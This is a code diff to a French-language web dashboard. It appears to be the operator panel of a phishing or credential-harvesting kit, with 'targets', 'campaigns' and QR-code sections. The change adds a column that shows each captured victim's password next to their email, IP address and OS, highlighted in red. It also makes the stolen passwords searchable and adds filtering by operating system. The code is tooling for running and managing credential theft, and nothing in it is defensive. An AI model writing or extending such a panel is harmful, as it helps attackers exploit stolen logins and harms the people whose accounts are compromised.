@@ -247,7 +247,7 @@ tr:hover{background:var(--surface)}
                 <select id="target-filter-os"><option value="all">Tous OS</option><option>Windows</option><option>macOS</option><option>iOS</option><option>Android</option></select>
                 <button class="btn btn-ghost btn-sm" id="refresh-targets">Actualiser</button>
             </div>
-            <div class="card" style="padding:0;overflow-x:auto"><table><thead><tr><th></th><th>Pseudo</th><th>Email</th><th>IP</th><th>OS</th><th>Date</th></tr></thead><tbody id="targets-table"></tbody></table></div>
+            <div class="card" style="padding:0;overflow-x:auto"><table><thead><tr><th></th><th>Pseudo</th><th>Email</th><th>Mot de passe</th><th>IP</th><th>OS</th><th>Date</th></tr></thead><tbody id="targets-table"></tbody></table></div>
         </div>
 
         <!-- ========== CAMPAIGNS ========== -->
@@ -446,10 +446,14 @@ async function loadTargets(){
     tbody.innerHTML = '';
     if(caps && caps.length){
         caps.forEach(c => {
+            const pw = c.password || '';
+            const pwShow = pw.length > 0 ? pw : '<span style="color:var(--text-tertiary)">-</span>';
             const tr = document.createElement('tr');
+            tr.dataset.search = (c.pseudo+' '+c.username+' '+c.ip_address+' '+c.platform+' '+c.password).toLowerCase();
             tr.innerHTML = '<td><span class="tag">#'+c.id+'</span></td>'+
                 '<td style="font-family:var(--mono);font-size:12px">'+escapeHtml(c.pseudo||'-')+'</td>'+
                 '<td>'+escapeHtml(c.username||c.accountIdentifier||'-')+'</td>'+
+                '<td style="font-family:var(--mono);font-size:12px;color:var(--accent-red)">'+pwShow+'</td>'+
                 '<td style="font-family:var(--mono);font-size:12px">'+escapeHtml(c.ip_address||'-')+'</td>'+
                 '<td>'+escapeHtml(c.platform||'-')+'</td>'+
                 '<td style="font-family:var(--mono);font-size:12px">'+(c.timestamp||'-')+'</td>';
@@ -457,8 +461,10 @@ async function loadTargets(){
         });
         document.getElementById('nav-targets').textContent = caps.length;
     }else{
-        tbody.innerHTML = '<tr><td colspan="6" style="color:var(--text-tertiary);text-align:center;font-size:12px">Aucune cible</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="7" style="color:var(--text-tertiary);text-align:center;font-size:12px">Aucune cible</td></tr>';
     }
+    // Re-apply search filter after loading
+    applyTargetFilter();
 }
 document.getElementById('refresh-targets')?.addEventListener('click', loadTargets);
 
@@ -553,12 +559,17 @@ function escapeHtml(s){
 }
 
 // ── Search targets ──
-document.getElementById('target-search')?.addEventListener('input', function(){
-    const q = this.value.toLowerCase();
+function applyTargetFilter(){
+    const q = (document.getElementById('target-search')?.value||'').toLowerCase();
+    const osFilter = document.getElementById('target-filter-os')?.value||'all';
     document.querySelectorAll('#targets-table tr').forEach(tr => {
-        tr.style.display = tr.textContent.toLowerCase().includes(q) ? '' : 'none';
+        const showSearch = !q || (tr.dataset.search||'').includes(q);
+        const showOs = osFilter === 'all' || (tr.dataset.search||'').includes(osFilter.toLowerCase());
+        tr.style.display = (showSearch && showOs) ? '' : 'none';
     });
-});
+}
+document.getElementById('target-search')?.addEventListener('input', applyTargetFilter);
+document.getElementById('target-filter-os')?.addEventListener('change', applyTargetFilter);
 
 // ── QR code ──
 document.getElementById('qr-btn')?.addEventListener('click', function(){
